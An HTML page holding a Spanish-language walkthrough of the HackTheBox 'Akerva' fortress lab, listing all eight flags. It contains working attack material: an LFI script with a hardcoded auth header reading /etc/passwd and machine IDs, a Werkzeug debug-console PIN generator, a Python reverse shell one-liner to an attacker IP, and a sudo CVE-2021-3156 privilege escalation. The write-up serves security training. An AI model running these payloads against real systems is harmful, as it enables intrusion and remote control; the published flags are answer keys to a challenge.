@@ -1,0 +1,414 @@
+<!doctype html>
+<html lang="en-US">
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+
+<title>Writeup Akerva HackTheBox</title>
+<link rel="shortcut icon" type="image/png" sizes="64x64" href="https://raw.githubusercontent.com/GatoGamer1155/Imagenes-Repositorios/main/ni/akerva.ico">
+<meta name="generator" content="Jekyll v4.2.2" />
+<meta property="og:title" content="Writeup Akerva HackTheBox" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Resolución de el fortress Akerva de la plataforma de HackTheBox" />
+<meta property="og:description" content="Resolución de el fortress Akerva de la plataforma de HackTheBox" />
+<link rel="canonical" href="http://localhost:4000/another-page.html" />
+<meta property="og:url" content="http://localhost:4000/another-page.html" />
+<meta property="og:site_name" content="Writeup Akerva HackTheBox" />
+<meta property="og:type" content="website" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Writeup Akerva HackTheBox" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"WebPage","description":"Resolución de el fortress Akerva de la plataforma de HackTheBox","headline":"Writeup Akerva HackTheBox","url":"http://localhost:4000/another-page.html"}</script>
+
+    <link rel="stylesheet" href="/assets/css/style.css?v=">
+    <script src="https://code.jquery.com/jquery-1.12.4.min.js" integrity="sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=" crossorigin="anonymous"></script>
+    <script src="/assets/js/respond.js"></script>
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+
+<meta name="theme-color" content="#353535">
+<meta name="msapplication-navbutton-color" content="#353535">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+
+  </head>
+  <body>
+
+    <div class="wrapper">
+
+      <section>
+        <div id="title">
+          <h1>Writeup Akerva HackTheBox</h1>
+          <p>Resolución de el fortress Akerva de la plataforma de HackTheBox</p>
+        </div>
+<div><strong><h3>Flag 1</h3></strong></div>
+<div><strong><h3>AKERVA{Ikn0w_F0rgoTTEN#CoMmeNts}</h3></strong></div>
+<div><p>Iniciamos escaneando los puertos de la máquina con nmap</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ nmap</span><span class="p"> 10.13.37.11
+Nmap scan report for 10.13.37.11
+22/tcp   open  ssh
+80/tcp   open  http
+5000/tcp open  upnp</span>
+</code></pre></div></div>
+<div><p>Solo necesitamos ver el codigo fuente de la página web "http://10.13.37.10" y encontramos un comentario con la flag</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p"><-- Hello folks! -->
+<-- This machine is powered by @lydericlefebvre from Akerva company. -->
+<-- You have to find 8 flags on this machine. Have a nice root! -->
+<-- By the way, the first flag is: </span><span class="kd">AKERVA{Ikn0w_F0rgoTTEN#CoMmeNts}</span><span class="p"> --></span>
+</code></pre></div></div>
+
+<div><strong><h3>Flag 2</h3></strong></div>
+<div><strong><h3>AKERVA{IkN0w_SnMP@@@MIsconfigur@T!onS}</h3></strong></div>
+<div><p>Haciendo un escaneo alternativo por udp nos encontramos el snmp abierto</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ sudo nmap</span><span class="p"> -sU --open -T5 --top-ports 200 10.13.37.11
+Nmap scan report for 10.13.37.11
+PORT      STATE         SERVICE
+161/udp   open          snmp</span>
+</code></pre></div></div>
+<div><p>Sabiendo esto podemos usar snmpbulkwalk grepeando por AKERVA suponiendo que obtendremos una flag que inicia igual que la anterior y efectivamente, la conseguimos
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ snmpbulkwalk</span><span class="p"> -v2c -c public 10.13.37.11 | </span><span class="s2">grep</span><span class="p"> AKERVA
+iso.3.6.1.2.1.25.4.2.1.5.1243 = STRING: "/var/www/html/scripts/backup_every_17minutes.sh </span><span class="kd">AKERVA{IkN0w_SnMP@@@MIsconfigur@T!onS}</span>
+</code></pre></div></div>
+
+<div><strong><h3>Flag 3</h3></strong></div>
+<div><strong><h3>AKERVA{IKNoW###VeRbTamper!nG_==}</h3></strong></div>
+<div><p>En la linea anterior encontramos "/var/www/html/scripts/backup_every_17minutes.sh", directorio al cual por una petición GET no podemos acceder pero por POST si</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ curl</span><span class="p"> http://10.13.37.11/scripts/backup_every_17minutes.sh
+401 Unauthorized
+This server could not verify that you
+are authorized to access the document
+requested.  Either you supplied the wrong
+credentials (e.g., bad password), or your
+browser doesn't understand how to supply
+the credentials required.</span>
+<span class="s2">❯ curl</span><span class="p"> -X POST http://10.13.37.11/scripts/backup_every_17minutes.sh
+#!/bin/bash
+#
+# This script performs backups of production and development websites.
+# Backups are done every 17 minutes.
+# </span><span class="kd">AKERVA{IKNoW###VeRbTamper!nG_==}</span><span class="p">
+
+SAVE_DIR=/var/www/html/backups
+
+while true
+do
+         ARCHIVE_NAME=backup_$(date +%Y%m%d%H%M%S)
+         echo "Erasing old backups..."
+         rm -rf $SAVE_DIR/*
+
+         echo "Backuping..."
+         zip -r $SAVE_DIR/$ARCHIVE_NAME /var/www/html/*
+
+         echo "Done..."
+         sleep 1020
+done</span>
+</code></pre></div></div>
+
+<div><strong><h3>Flag 4</h3></strong></div>
+<div><strong><h3>AKERVA{1kn0w_H0w_TO_$Cr1p_T_$$$$$$$$}</h3></strong></div>
+<div><p>Antes también veiamos un script que si lo analizamos crea un .zip comprimiendo cada 1020 segundos todo lo que esta en /var/www/html en /var/www/html/backups con el nombre iniciando con backup_ seguido de el año, mes, dia, hora, minuto y segundo en el que se creó</p></div>
+<div><p>Podemos conseguir algo cercano al hacer un curl y mirar la cabecera de respuesta date</div></p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ curl</span><span class="p"> -I 10.13.37.11 | </span><span class="s2">grep</span><span class="p"> Date
+Date: Fri, 10 Jun 2022 01:03:01 GMT</span>
+</code></pre></div></div>
+<div><p>Con esta información podemos obtener una parte del nombre que quedaria algo como "backup_2022061001****.zip" donde **** son los minutos y segundos ya que es probable que sean diferentes a cuando se hizo el backup</div></p>
+<div><p>Pero el resto de la cadena tambien podemos conseguirlo por fuerza bruta esta vez con wfuzz de la siguiente manera</div></p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ wfuzz</span><span class="p"> -c -u http://10.13.37.11/backups/backup_2022061001FUZZ.zip -w /usr/share/seclists/Fuzzing/4-digits-0000-9999.txt --hc 404
+
+Target: http://10.13.37.11/backups/backup_2022061001FUZZ.zip
+Total requests: 10000
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                                                                      
+=====================================================================
+
+000000227:   </span><span class="s2">200</span><span class="p">        9 L      42 W       493 Ch      "0226"</span>
+</code></pre></div></div>
+<div><p>Ahora con el resto de datos podemos conseguir el nombre "backup_20220610010226.zip" entonces hacemos un wget a la ruta donde se guarda y conseguimos el zip</div></p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ wget</span><span class="p"> http://10.13.37.11/backups/backup_20220610010226.zip
+Grabando a: «backup_20220610010226.zip»
+
+backup_20220610010226.zip      100%[=================================>]  21.05M</span>
+</code></pre></div></div>
+<div><p>Despues de descomprimirlo podemos ver un archivo en var/www/html/dev/ que tiene la flag</div></p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="c1">var/www/html/dev</span><span class="s2"> ❯ cat</span><span class="p"> space_dev.py
+</span><span class="c1">#!/usr/bin/python</span><span class="kd">
+
+from</span><span class="p"> flask </span><span class="kd">import</span><span class="p"> Flask, request
+</span><span class="kd">from</span><span class="p"> flask_httpauth </span><span class="kd">import</span><span class="p"> HTTPBasicAuth
+</span><span class="kd">from</span><span class="p"> werkzeug.security </span><span class="kd">import</span><span class="p"> generate_password_hash, check_password_hash
+
+app </span><span class="kd">=</span><span class="p"> Flask(__name__)
+auth </span><span class="kd">=</span><span class="p"> HTTPBasicAuth()
+
+users </span><span class="kd">=</span><span class="p"> {
+        </span><span class="s2">"aas"</span><span class="p">: generate_password_hash(</span><span class="s2">"</span><span class="kd">AKERVA{1kn0w_H0w_TO_$Cr1p_T_$$$$$$$$}</span><span class="p"></span><span class="s2">"</span><span class="p">)
+        }
+
+</span><span class="kd">@auth.verify_password</span><span class="k">
+def verify_password</span><span class="p">(</span><span class="no">username</span><span class="p">,</span><span class="no"> password</span><span class="p">):
+    </span><span class="kd">if</span><span class="p"> username </span><span class="kd">in</span><span class="p"> users:
+        </span><span class="kd">return </span><span class="p">check_password_hash(users.get(username), password)
+    </span><span class="kd">return</span><span class="p"> False
+
+</span><span class="kd">@app.route</span><span class="p">(</span><span class="s2">'/'</span><span class="p">)
+</span><span class="kd">@auth.login_required
+</span><span class="k">def hello_world</span><span class="p">():
+    </span><span class="kd">return </span><span class="s2">'Hello, World!'</span><span class="c1">
+
+# TODO</span><span class="kd">
+@app.route</span><span class="p">(</span><span class="s2">'/download'</span><span class="p">)
+</span><span class="kd">@auth.login_required
+</span><span class="k">def download</span><span class="p">():
+    </span><span class="kd">return</span><span class="p"> downloaded_file
+
+</span><span class="kd">@app.route</span><span class="p">(</span><span class="s2">"/file"</span><span class="p">)
+</span><span class="kd">@auth.login_required
+</span><span class="k">def file</span><span class="p">():
+	filename </span><span class="kd">=</span><span class="p"> request.args.get(</span><span class="s2">'filename'</span><span class="p">)
+	</span><span class="kd">try</span><span class="p">:
+		</span><span class="kd">with </span><span class="k">open</span><span class="p">(filename, </span><span class="s2">'r'</span><span class="p">) </span><span class="kd">as</span><span class="p"> f:
+			</span><span class="kd">return</span><span class="p"> f.read()
+	</span><span class="kd">except</span><span class="p">:
+		</span><span class="kd">return </span><span class="s2">'error'</span><span class="kd">
+
+if</span><span class="p"> __name__ </span><span class="kd">== </span><span class="s2">'__main__'</span><span class="p">:
+    </span><span class="k">print</span><span class="p">(app)
+    </span><span class="k">print</span><span class="p">(</span><span class="k">getattr</span><span class="p">(app, </span><span class="s2">'__name__'</span><span class="p">, getattr(app.__class__, </span><span class="s2">'__name__'</span><span class="p">)))
+    app.run(</span><span class="no">host</span><span class="kd">=</span><span class="s2">'0.0.0.0'</span><span class="p">, </span><span class="no">port</span><span class="kd">=</span><span class="s2">'5000'</span><span class="p">, </span><span class="no">debug </span><span class="kd">= </span><span class="p">True)</span>
+</code></pre></div></div>
+
+<div><strong><h3>Flag 5</h3></strong></div>
+<div><strong><h3>AKERVA{IKNOW#LFi_@_}</h3></strong></div>
+
+<div><p>El script dice que podemos autenticarnos como el usuario aas y con la flag como contraseña, esto se puede probar en el puerto 5000 y efectivamente nos conectan</div></p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">users </span><span class="kd">=</span><span class="p"> {
+        </span><span class="s2">"aas"</span><span class="p">: generate_password_hash(</span><span class="s2">"</span><span class="kd">AKERVA{1kn0w_H0w_TO_$Cr1p_T_$$$$$$$$}</span><span class="p"></span><span class="s2">"</span><span class="p">)
+        }</span>
+<span class="kd">@auth.verify_password</span><span class="k">
+def verify_password</span><span class="p">(</span><span class="no">username</span><span class="p">,</span><span class="no"> password</span><span class="p">):
+    </span><span class="kd">if</span><span class="p"> username </span><span class="kd">in</span><span class="p"> users:
+        </span><span class="kd">return </span><span class="p">check_password_hash(users.get(username), password)
+    </span><span class="kd">return</span><span class="p"> False
+</code></pre></div></div>
+<div><p><img src="./1.png"><p></div>
+
+<div><p>Volviendo al .py encontramos una funcion que puede llegar a ocasionar un lfi con /file y el atributo filename</div></p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="kd">@app.route</span><span class="p">(</span><span class="s2">"/file"</span><span class="p">)
+</span><span class="kd">@auth.login_required</span>
+<span class="k">def file</span><span class="p">():
+        filename </span><span class="kd">=</span><span class="p"> request.args.get(</span><span class="s2">'filename'</span><span class="p">)</span>
+        </span><span class="kd">try</span><span class="p">:
+                </span><span class="kd">with </span><span class="k">open</span><span class="p">(filename, </span><span class="s2">'r'</span><span class="p">) </span><span class="kd">as</span><span class="p"> f:
+                        </span><span class="kd">return</span><span class="p"> f.read()
+        </span><span class="kd">except</span><span class="p">:
+                </span><span class="kd">return </span><span class="s2">'error'</span><span class="kd"></span>
+</code></pre></div></div>
+
+<div><p>Entonces si estamos logueados podemos obtener archivos de la maquina como en el siguiente ejemplo el /etc/hostname</div></p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">http://10.13.37.11:5000/file?filename=/etc/hostname</span>
+</code></pre></div></div>
+<div><p><img src="./2.png"><p></div>
+<div><p>Si vemos como se tramita la petición vemos una cookie como header, entonces nos podemos crear un exploit como el siguiente para el lfi</div></p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">GET http://10.13.37.11:5000/ HTTP/1.1
+Authorization: Basic YWFzOkFLRVJWQXsxa24wd19IMHdfVE9fJENyMXBfVF8kJCQkJCQkJH0=</span>
+</code></pre></div></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="c1">#!/usr/bin/python3</span>
+</span><span class="kd">import</span><span class="p"> requests, sys
+
+</span><span class="kd">if </span><span class="k">len</span><span class="p">(sys.argv) </span><span class="no"><</span><span class="p"> 2:
+    </span><span class="k">print</span><span class="p">(</span><span class="k">f</span><span class="s2">"\n[\033[1;31m-\033[1;37m] Uso: python3 {sys.argv[0]} &lt;archivo&gt;\n"</span><span class="p">)
+    sys.exit(</span><span class="no">1</span><span class="p">)
+
+target </span><span class="kd">=</span><span class="s2"> "http://10.13.37.11:5000/file?filename="</span><span class="p">
+headers </span><span class="kd">=</span><span class="p"> {</span><span class="s2">"Authorization"</span><span class="p">:</span><span class="s2">"Basic YWFzOkFLRVJWQXsxa24wd19IMHdfVE9fJENyMXBfVF8kJCQkJCQkJH0="</span><span class="p">}
+request </span><span class="kd">=</span><span class="p"> requests.get(target</span><span class="kd"> + </span><span class="p">sys.argv[</span><span class="no">1</span><span class="p">], </span><span class="no">headers</span><span class="kd">=</span><span class="p">headers)
+response </span><span class="kd">=</span><span class="p"> request.text
+</span><span class="k">print</span><span class="p">(response)</span>
+</code></pre></div></div>
+<div><p>Ahora usando el exploit de lfi y viendo que existe el usuario aas a nivel de sistema y suponiendo que la flag se llama flag.txt en otro fortress la intentaremos obtener</div></p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ python3</span><span class="p"> lfi.py /etc/passwd | </span><span class="s2">grep<span class="p"> bash
+root:x:0:0:root:/root:/bin/bash
+</span><span class="kd">aas</span><span class="p">:x:1000:1000:Lyderic Lefebvre:/home/aas:/bin/bash
+</span><span class="s2">❯ python3</span><span class="p"> lfi.py /home/aas/flag.txt            
+<span class="kd">AKERVA{IKNOW#LFi_@_}</span>
+</code></pre></div></div>
+
+<div><strong><h3>Flag 6</h3></strong></div>
+<div><strong><h3>AKERVA{IkNOW#=ByPassWerkZeugPinC0de!}</h3></strong></div>
+<div><p>Si buscamos direcctorios con gobuster encontramos console que esta protegido por un pin</div></p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ gobuster</span><span class="p"> dir -u http://10.13.37.11:5000 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -t 100
+===============================================================
+[+] Threads:                 100
+[+] Url:                     http://10.13.37.11:5000
+[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+</span><span class="kd">/console</span><span class="p">              (Status: 200) [Size: 1985]</span>
+</code></pre></div></div>
+<div><p>Para el pin de werzeug encontramos un <a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/werkzeug">exploit</a> en hacktricks al final de la página al cual tenemos que cambiar los siguientes argumentos</div></p>
+<div><p>Primero el username ya que sabemos que el usuario es aas usaremos a el como usuario</div></p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">'</span><span class="k">web3_user</span><span class="s2">'</span><span class="p">, </span><span class="c1"># username
+</span><span class="s2">'</span><span class="kd">aas</span><span class="s2">'</span><span class="p">, </span><span class="c1"># username</span>
+</code></pre></div></div>
+
+<div><p>Ahora la versión de python si vemos la cabecera Server a el servidor vemos python2.7</div></p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ curl</span><span class="p"> 10.13.37.11:5000/console -I | </span><span class="s2">grep</span><span class="p"> Server
+Server: Werkzeug/0.16.0 Python/2.7</span>
+</code></pre></div></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">'</span><span class="k">/usr/local/lib/python3.5/dist-packages/flask/app.py</span><span class="s2">'</span><span class="p">, </span><span class="c1"># getattr(mod, '__file__', None),
+</span><span class="s2">'</span><span class="kd">/usr/local/lib/python2.7/dist-packages/flask/app.pyc</span><span class="s2">'</span><span class="p">, </span><span class="c1"># getattr(mod, '__file__', None),</span>
+</code></pre></div></div>
+
+<div><p>Ahora la linea en private bites, esta es dinámica pero podemos conseguirla con el lfi y convirtiendola con 0x</div></p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ python3</span><span class="p"> lfi.py /sys/class/net/ens33/address
+00:50:56:b9:ca:91</span><span class="s2">
+❯ python3</span><span class="p"> -c 'print(0x005056b9ca91)'
+345052400273</span>
+</code></pre></div></div>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">'</span><span class="k">279275995014060<span class="s2">'</span><span class="p">, </span><span class="c1"># str(uuid.getnode()),  /sys/class/net/ens33/address
+</span><span class="s2">'</span><span class="kd">345052400273</span><span class="s2">'</span><span class="p">, </span><span class="c1"># str(uuid.getnode()),  /sys/class/net/ens33/address</span>
+</code></pre></div></div>
+
+<div><p>El siguiente simplemente también es dinámico y lo conseguimos con el lfi</div></p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ python3</span><span class="p"> lfi.py /etc/machine-id
+258f132cd7e647caaf5510e3aca997c1</span>
+</code></pre></div></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">'</span><span class="k">d4e6cb65d59544f3331ea0425dc555a1</span><span class="s2">'</span><span class="p">, </span><span class="c1"># get_machine_id(), /etc/machine-id
+</span><span class="s2">'</span><span class="kd">258f132cd7e647caaf5510e3aca997c1</span><span class="s2">'</span><span class="p">, </span><span class="c1"># get_machine_id(), /etc/machine-id</span>
+</code></pre></div></div>
+
+<div><p>El script en mi caso quedaría asi, recuerda cambiar los dos ultimos valores a los tuyos ya que son dinámicos</div></p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="kd">import</span><span class="p"> hashlib
+</span><span class="kd">from </span><span class="p">itertools </span><span class="kd">import</span><span class="p"> chain
+probably_public_bits </span><span class="kd">=</span><span class="p"> [
+    </span><span class="s2">'aas'</span><span class="p">,</span><span class="c1"> # username
+    </span><span class="s2">'flask.app'</span><span class="p">,</span><span class="c1"> # modname
+    </span><span class="s2">'Flask'</span><span class="p">, </span><span class="c1"># getattr(app, '__name__', getattr(app.__class__, '__name__'))
+    </span><span class="s2">'/usr/local/lib/python2.7/dist-packages/flask/app.pyc'</span><span class="c1"> # getattr(mod, '__file__', None),
+</span><span class="p">]
+
+private_bits </span><span class="kd">=</span><span class="p"> [
+    </span><span class="s2">'345052400273'</span><span class="p">,</span><span class="c1"> # str(uuid.getnode()),  /sys/class/net/ens33/address
+    </span><span class="s2">'258f132cd7e647caaf5510e3aca997c1'</span><span class="c1"> # get_machine_id(), /etc/machine-id
+</span><span class="p">]
+
+h </span><span class="kd">=</span><span class="p"> hashlib.md5()
+</span><span class="kd">for </span><span class="p">bit </span><span class="kd">in</span><span class="p"> chain(probably_public_bits, private_bits):
+    </span><span class="kd">if not </span><span class="p">bit:
+        </span><span class="kd">continue
+    if</span><span class="k"> isinstance</span><span class="p">(bit, </span><span class="no">str</span><span class="p">):
+        bit </span><span class="kd">=</span><span class="p"> bit.encode(</span><span class="s2">'utf-8'</span><span class="p">)
+    h.update(bit)
+h.update(</span><span class="k">b</span><span class="s2">'cookiesalt'</span><span class="p">)
+</span><span class="c1">#h.update(b'shittysalt')
+
+</span><span class="p">cookie_name </span><span class="kd">=</span><span class="s2"> '__wzd'</span><span class="kd"> + </span><span class="p">h.hexdigest()[:</span><span class="no">20</span><span class="p">]
+
+num </span><span class="kd">=</span><span class="no"> None
+</span><span class="kd">if </span><span class="p">num </span><span class="kd">is </span><span class="no">None</span><span class="p">:
+    h.update(</span><span class="k">b</span><span class="s2">'pinsalt'</span><span class="p">)
+    num </span><span class="kd">=</span><span class="p"> (</span><span class="s2">'</span><span class="no">%09d</span><span class="s2">'</span><span class="no"> % </span><span class="k">int</span><span class="p">(h.hexdigest(), </span><span class="no">16</span><span class="p">))[:</span><span class="no">9</span><span class="p">]
+
+rv </span><span class="kd">=</span><span class="no"> None
+</span><span class="kd">if</span><span class="p"> rv </span><span class="kd">is </span><span class="no">None</span><span class="p">:
+    </span><span class="kd">for </span><span class="p">group_size </span><span class="kd">in </span><span class="no">5</span><span class="p">,</span><span class="no"> 4</span><span class="p">,</span><span class="no"> 3</span><span class="p">:
+        </span><span class="kd">if </span><span class="k">len</span><span class="p">(num) </span><span class="no">%</span><span class="p"> group_size </span><span class="kd">== </span><span class="no">0</span><span class="p">:
+            rv </span><span class="kd">=</span><span class="s2"> '-'</span><span class="p">.join(num[x:x </span><span class="kd">+</span><span class="p"> group_size].rjust(group_size, </span><span class="s2">'0'</span><span class="p">)
+                          </span><span class="kd">for </span><span class="p">x</span><span class="kd"> in</span><span class="k"> range</span><span class="p">(</span><span class="no">0</span><span class="p">, </span><span class="k">len</span><span class="p">(num), group_size))
+            </span><span class="kd">break
+    </span><span class="kd">else</span><span class="p">:
+        rv </span><span class="kd">=</span><span class="p"> num
+
+</span><span class="k">print</span><span class="p">(rv)</span>
+</code></pre></div></div>
+
+<div><p>Con los valores modificados cuando lo ejecutemos deberiamos obtener un pin válido para <a href="http://10.13.37.11:5000/console">10.13.37.11:5000/console</a></div></p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ python3</span><span class="p"> pin.py
+199-187-272</span>
+</code></pre></div></div>
+
+<div><p>Introducimos el pin en <a href="http://10.13.37.11:5000/console">10.13.37.11:5000/console</a> y nos queda una consola de python entonces haremos una reverse shell con ella y leerémos la flag que esta oculta</div></p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">[console ready]
+>>> import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.13.14.10",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);</span>
+</code></pre></div></div>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ sudo netcat</span><span class="p"> -lvnp 443
+Connection received on 10.13.37.11
+</span><span class="s2">aas@Leakage</span><span class="p">:</span><span class="na">~</span><span class="p">$ ls -a
+. ..  .bash_history .bash_logout .bashrc flag.txt .hiddenflag.txt .ssh
+</span><span class="s2">aas@Leakage</span><span class="p">:</span><span class="na">~</span><span class="p">$ cat .hiddenflag.txt
+</span><span class="kd">AKERVA{IkNOW#=ByPassWerkZeugPinC0de!}</span>
+</code></pre></div></div>
+
+<div><strong><h3>Flag 7</h3></strong></div>
+<div><strong><h3>AKERVA{IkNow_Sud0_sUckS!}</h3></strong></div>
+<div><p>Ahora buscando formas de escalar privilegios vemos que la versión de sudo es antigua entonces utilizaremos un <a href="https://github.com/GatoGamer1155/CVE-2021-3156">exploit</a> para convertirnos en root</div></p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">aas@Leakage</span><span class="p">:</span><span class="na">/tmp</span><span class="p">$ sudo --version
+Sudo version 1.8.21p2
+</span><span class="s2">aas@Leakage</span><span class="p">:</span><span class="na">/tmp</span><span class="p">$ python3 exploit.py
+ [+] Iniciando el exploit 
+ [+] Exploit completado 
+# whoami
+root
+# cat /root/flag.txt
+</span><span class="kd">AKERVA{IkNow_Sud0_sUckS!}</span><span class="p">
+#</span>
+</code></pre></div></div>
+
+<div><strong><h3>Flag 8</h3></strong></div>
+<div><strong><h3>AKERVA{IKNOOOWVIGEEENERRRE}</h3></strong></div>
+<div><p>En el directorio de root tambien encontramos un "secured_note.md" que parece ser una cadena en base64 por ahora la decodearemos y nos quedaremos con ella</div></p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">root@Leakage</span><span class="p">:</span><span class="na">~</span><span class="p"># cat secured_note.md 
+R09BSEdIRUVHU0FFRUhBQ0VHVUxSRVBFRUVDRU9LTUtFUkZTRVNGUkxLRVJVS1RTVlBNU1NOSFNL
+UkZGQUdJQVBWRVRDTk1ETFZGSERBT0dGTEFGR1NLRVVMTVZPT1dXQ0FIQ1JGVlZOVkhWQ01TWUVM
+U1BNSUhITU9EQVVLSEUK
+
+@AKERVA_FR | @lydericlefebvre
+</span><span class="s2">root@Leakage</span><span class="p">:</span><span class="na">~</span><span class="p"># echo "R09BSEdIRUVHU0FFRUhBQ0VHVUxSRVBFRUVDRU9LTUtFUkZTRVNGUkxLRVJVS1RTVlBNU1NOSFNLUkZGQUdJQVBWRVRDTk1ETFZGSERBT0dGTEFGR1NLRVVMTVZPT1dXQ0FIQ1JGVlZOVkhWQ01TWUVMU1BNSUhITU9EQVVLSEUK" | base64 -d
+GOAHGHEEGSAEEHACEGULREPEEECEOKMKERFSESFRLKERUKTSVPMSSNHSKRFFAGIAPVETCNMDLVFHDAOGFLAFGSKEULMVOOWWCAHCRFVVNVHVCMSYELSPMIHHMODAUKHE
+</span><span class="s2">root@Leakage</span><span class="p">:</span><span class="na">~</span><span class="p">#</span>
+</code></pre></div></div>
+<div><p>Usaremos <a href="https://dcode.fr/viginere-cipher">vigenere-cipher</a> para decodear la cadena que nos queda</div></p>
+<div><p>Ya que no tenemos las letras B,J,Q,X,Z nuestro alphabet se reduce a "ACDEFGHIKLMNOPRSTUVWY" además conocemos una parte en texto claro la cadena "AKERVA" ya que asi inicia la flag, introducimos esa información y le damos a decrypt</div></p>
+<div><p><img src="./3.png"><p></div>
+<div><p>Ahora en la parte izquierda podemos encontrar la flag</p></div>
+<div><p><img src="./4.png"><p></div>
+
+<p><a href="./../../">Página Principal</a></p>
+
+      </section>
+
+    </div>
+  </body>
+</html>
